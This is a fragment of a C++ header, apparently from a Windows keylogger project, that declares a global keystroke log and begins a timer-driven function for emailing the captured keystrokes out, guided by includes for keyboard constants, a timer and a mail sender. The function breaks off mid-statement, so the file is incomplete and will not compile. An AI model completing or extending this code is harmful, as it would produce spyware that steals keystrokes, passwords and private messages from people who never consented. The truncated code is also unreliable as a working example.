#pragma once
#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

void TimerSendMail()
{
	if (keylog.empty())
		return;
	std::string last_file = 


#endif // !KEYBHOOK_H
